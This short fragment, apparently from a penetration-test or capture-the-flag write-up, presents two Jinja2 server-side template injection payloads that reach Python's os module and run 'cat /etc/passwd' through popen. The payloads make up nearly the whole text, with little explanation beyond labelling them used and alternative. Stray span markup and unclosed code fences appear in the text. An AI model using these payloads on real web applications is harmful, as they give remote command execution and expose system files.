
## Used Payload
To successfully exploit the Server-Side Template Injection (SSTI) vulnerability and retrieve the contents of the `/etc/passwd` file[span_1](start_span)[span_1](end_span), the following template payload was injected:

```jinja2
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /etc/passwd').read() }}




## Alternative Payload
As an alternative approach, the following template payload using the application configuration object can also be injected to retrieve the contents of the `/etc/passwd` file:

```jinja2
{{ config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read() }}
